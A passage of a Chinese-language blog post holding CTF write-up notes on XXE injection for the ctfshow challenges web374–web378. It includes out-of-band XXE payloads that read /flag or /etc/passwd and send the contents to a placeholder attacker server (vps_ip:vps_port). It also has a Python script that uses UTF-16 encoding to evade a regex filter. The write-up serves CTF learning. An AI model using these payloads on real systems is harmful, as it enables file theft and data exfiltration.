+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">``` xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://vps_ip:vps_port/xxe.php?1=%file;&#x27;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+<p>这里首先定义了一个<code>all</code>参数实体，其内容为一个xml实体定义，即</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="meta">&lt;!ENTITY &amp;#x25; <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://vps_ip:vps_port/xxe.php?1=%file;&#x27;</span><span class="string">&quot;&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>其中，<code>&amp;#x25;</code>是<code>%</code>的unicode编码。这个<code>all</code>实体定义了一个名为<code>send</code>的实体，其值是一个带有参数的url，用于引入外部实体，其中的 <code>%file;</code>即为被攻击者注入的xml实体。</p>
+<p>再看发送的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps_ip:vps_port/xxe.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>定义了两个实体，分别为<code>file</code>和<code>remote</code>。首先，<code>file</code>的外部实体用于把<code>/flag</code>的内容转成base64做内容；<code>remote</code>的外部实体就是我们vps定义的<code>xxe.xml</code>。</p>
+<p>在攻击时，payload被传上去时，首先是<code>%remote</code>取了vps上<code>xxe.xml</code>作为实体，也就是<code>%all</code>。在<code>%all</code>中定义了一个<code>%send</code>实体，其将<code>%file</code>（base64编码的<code>/flag</code>内容）作为get参数访问了vps的服务，从而可以在vps处接收到flag。</p>
+<h4 id="什么是xml的"><a href="#什么是xml的" class="headerlink" title="什么是xml的%"></a>什么是xml的<code>%</code></h4><p>听GPT说：</p>
+<blockquote>
+<p>在XML实体中，百分号（<code>%</code>）用于引用参数实体。参数实体是一种特殊类型的实体，其值通常用于定义其他实体或在文档中多次引用相同的值。在这种情况下，<code>%file</code> 和 <code>%remote</code> 是参数实体，它们分别引用了外部实体 <code>file</code> 和 <code>remote</code>。使用参数实体可以使XML文档更具可读性和可维护性，因为它们允许在文档的不同部分多次引用相同的值。</p>
+</blockquote>
+<p>XML 参数实体是一种特殊类型的实体，在 XML 文档中使用 <code>%</code> 符号来定义。参数实体与普通实体类似，但其值可以在文档中的多个地方引用，并且可以在定义时传入参数。参数实体的定义格式如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">entity_name</span> <span class="string">&quot;entity_value&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中，<code>entity_name</code> 是参数实体的名称，<code>entity_value</code> 是参数实体的值。在定义参数实体时，可以使用 <code>%</code> 符号来引用其他实体，也可以定义带有参数的实体。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/?file=%file;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在这个例子中，<code>%file;</code> 是一个参数实体，其值是指向 <code>/etc/passwd</code> 文件的路径。<code>%remote;</code> 是另一个参数实体，其值是一个 URL，其中包含了 <code>file</code> 参数，该参数的值是 <code>%file;</code> 的值。</p>
+<p>那么，可以把web373的payload改为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span>&amp;%xxe;;<span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>吗？ 答案是不行的。因为：</p>
+<blockquote>
+<p>在 XML 中，<strong>参数实体不能直接显示在文档中</strong>。参数实体只能用于定义和传递值，而不能直接在文档中显示。这是因为参数实体只是 XML 解析器在解析文档时使用的一种机制，它们不会直接在最终输出的 XML 内容中显示出来。</p>
+</blockquote>
+<blockquote>
+<p>在 XML 文档中，只有实体引用（entity reference）才会在最终的文档中显示。比如，<code>&amp;xxe;</code> 是一个实体引用，它会在解析时被替换为参数实体 <code>%xxe;</code> 的值。因此，虽然 <code>%xxe;</code> 是参数实体，不能直接显示，但通过实体引用 <code>&amp;xxe;</code>，其值可以在文档中显示出来。</p>
+</blockquote>
+<h2 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
+
+<p>相较上一题加入了对xml头文件的过滤，具体来说是关于<code>&#39;/&lt;\?xml version=&quot;1\.0&quot;/&#39;</code>的过滤。解法同上题。</p>
+<h2 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>相较上一题加入了对xml头文件的过滤，具体来说比起上一题加了大小写过滤。解法同上题。</p>
+<h2 id="web377-转换文本编码绕过对xml的正则约束"><a href="#web377-转换文本编码绕过对xml的正则约束" class="headerlink" title="web377 - 转换文本编码绕过对xml的正则约束"></a>web377 - 转换文本编码绕过对xml的正则约束</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
+<p>相较上一题加入了对http的过滤。</p>
+<p>修改poc如下：由于不能直接用burpsuite来做<code>utf-16</code>的转换，所以用python发包。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://ab776b2f-ef20-41ab-8e94-429b29649a1b.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://vps_ip:vps_port/xxe.xml&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过正则</span></span><br><span class="line">data = data.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(ret.text)</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>XML 文档在被解析时，解析器通常会根据文档的声明和内容自动检测和使用正确的编码。即使你的 XML 文档被保存为 <code>UTF-16</code> 编码，但在解析时，解析器会尝试正确地解析这种编码的文档。</p>
+</blockquote>
+<blockquote>
+<p>在 PHP 中，使用 <code>DOMDocument</code> 类解析 XML 时，可以通过 <code>loadXML</code> 方法的第二个参数 <code>LIBXML_NOENT</code> 和 <code>LIBXML_DTDLOAD</code> 来控制对外部实体和 DTD 的加载。这两个参数并不影响解析器对文档编码的处理，而是用于控制解析器是否应该加载外部实体和 DTD。因此，即使文档是 <code>UTF-16</code> 编码的，在这种情况下解析器也能够正确地解析它。</p>
+</blockquote>
+<blockquote>
+<p>总的来说，XML 解析器通常会自动处理各种编码的 XML 文档，只要文档本身的格式正确，并且解析器能够识别和支持这种格式。</p>
+</blockquote>
+<h2 id="web378-登录页面的xxe"><a href="#web378-登录页面的xxe" class="headerlink" title="web378 - 登录页面的xxe"></a>web378 - 登录页面的xxe</h2><p>是个登录页面，随便输入点什么然后抓包，发现提交的是xml格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>123<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试xxe。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功回显<code>/etc/passwd</code>内容。</p>
+<p>获取flag：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">1.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web373-%E7%AE%80%E5%8D%95%E7%9A%84XXE%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.</span> <span class="toc-text">web373 - 简单的XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E8%AF%BB%E5%8F%96XML%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">详解读取XML的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E6%94%BB%E5%87%BBpayload"><span class="toc-number">1.1.2.</span> <span class="toc-text">详解攻击payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xml-%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">xml 实体引用格式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBpayload%E7%BC%96%E5%86%99"><span class="toc-number">1.1.3.</span> <span class="toc-text">攻击payload编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web374"><span class="toc-number">1.2.</span> <span class="toc-text">web374</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E8%BE%93%E5%87%BA%E5%A4%96%E5%B8%A6%E5%92%8C%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">将输出外带和引用外部实体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFxml%E7%9A%84"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">什么是xml的%</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web375"><span class="toc-number">1.3.</span> <span class="toc-text">web375</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web376"><span class="toc-number">1.4.</span> <span class="toc-text">web376</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web377-%E8%BD%AC%E6%8D%A2%E6%96%87%E6%9C%AC%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%AF%B9xml%E7%9A%84%E6%AD%A3%E5%88%99%E7%BA%A6%E6%9D%9F"><span class="toc-number">1.5.</span> <span class="toc-text">web377 - 转换文本编码绕过对xml的正则约束</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web378-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%9A%84xxe"><span class="toc-number">1.6.</span> <span class="toc-text">web378 - 登录页面的xxe</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-xxe入门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-xxe入门"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-xxe入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-xxe入门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-xxe入门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
